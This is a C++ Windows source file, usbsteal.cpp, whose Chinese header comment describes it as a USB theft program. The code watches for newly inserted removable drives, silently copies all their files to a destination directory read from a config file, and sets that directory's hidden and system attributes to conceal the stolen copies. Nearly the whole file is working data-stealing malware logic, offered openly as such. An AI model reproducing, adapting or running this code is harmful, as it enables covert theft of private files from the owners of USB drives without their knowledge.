/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* 文件名称：usbsteal.cpp
* 文件标识：见配置管理计划书
* 摘    要：USB盗窃程序,生成线程监视并盗窃U盘内容
*
* 当前版本：1.0
* 作    者：outmatch
* 完成日期：2006年9月6日
*
* 取代版本：无
* 原作者  ：
* 完成日期：
*/

#include "config.h"
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <tchar.h>
#include <fstream>
#include <time.h>
#include "folderutils.h"

using namespace std;

typedef std::vector<std::string> usbList;

extern const std::string& getConfigPath();

std::string getDestDirName();
usbList searchforUSB();
DWORD setDirHidden(const std::string &dir);
void copierThreadFunc(LPVOID *);

usbList searchforUSB()
{
	static usbList prevUsbList; 
	usbList list;
	char buf[MAX_PATH+1];
	DWORD len = GetLogicalDriveStrings(sizeof(buf), buf);

	for(CHAR *s=buf; *s; s+=strlen(s) + 1) {
		UINT uDriveType = GetDriveType(s);
		if(uDriveType == DRIVE_REMOVABLE) {
			list.push_back((s));
		}
	}

	if(prevUsbList == list) {
		list.clear();
		return list;
	}
	else {
		// 有改变,报告prevUsbList 和 list差异的部分.
		usbList newlist;

		for(usbList::iterator it = list.begin();
				it != list.end();
				++it)
		{
			bool skip = false;
			for(int i=0; i<prevUsbList.size(); i++) {
				if(*it == prevUsbList[i])
				{
					skip = true;	
					break;
				}
				else
				{
					skip = false;
				}
			}

			if(skip == false) {
				newlist.push_back(*it);
			}
		}
		prevUsbList = list;
		return newlist;
	}
}

void copierThreadFunc(LPVOID *)
{
	// Search for USB device
	for( ;; ) {
		usbList list;
		list = searchforUSB();

		if(list.size() > 0) {
			for(int i=0; i<list.size(); i++) {
				string srcDir = list[i];
				string dstDir = getDestDirName();
				srcDir += "*.*";
#if 0
				MessageBox(0, srcDir.c_str(), "SRC", 0);
#endif
				CFolderUtils::CopyFolder(srcDir.c_str(), dstDir.c_str());
				Sleep(INTERVAL);
			}
		}

		Sleep(INTERVAL);
	}
}

std::string getDestDirName()
{
	std::string dir;

	ifstream f(getConfigPath().c_str());
	f >> dir;
	dir += "\\";

	CFolderUtils::CreateFolder(dir.c_str());
	setDirHidden(dir);

	time_t ti = time(0);
	char buf[MAX_PATH+1] = { "\0" };
	_snprintf(buf, MAX_PATH, "%ld", time(0));
	dir += buf;
	CFolderUtils::CreateFolder(dir.c_str());

	return dir;
}

DWORD setDirHidden(const std::string &dir)
{
	DWORD stat = GetFileAttributes( dir.c_str());
	stat |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	DWORD ret = SetFileAttributes( dir.c_str(), stat );

	return ret;
}

